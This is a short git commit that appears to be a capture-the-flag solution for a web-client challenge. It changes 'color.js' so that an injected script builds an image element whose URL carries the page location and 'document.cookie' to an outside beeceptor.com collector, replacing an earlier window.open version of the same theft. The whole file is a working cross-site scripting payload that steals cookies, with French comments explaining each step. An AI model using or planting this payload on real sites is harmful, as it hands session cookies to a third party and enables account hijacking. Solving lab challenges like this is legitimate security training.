7bdb4bce0fceaef65b44bce671f07361a4587ea8
blaisedubs6 <104782871+blaisedubs6@users.noreply.github.com>
2026-04-06 17:08:01 +0200

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,1 +1,3 @@
-window.open("https://recept.free.beeceptor.com?="+document.cookie);
+im=document.createElement('img'); // je crée une image
+im.src="https://recept.free.beeceptor.com?loc="+document.location+"&cookie="+document.cookie; // j'appelle l'image avec en parametre le cookie
+document.body.appendChild(im);
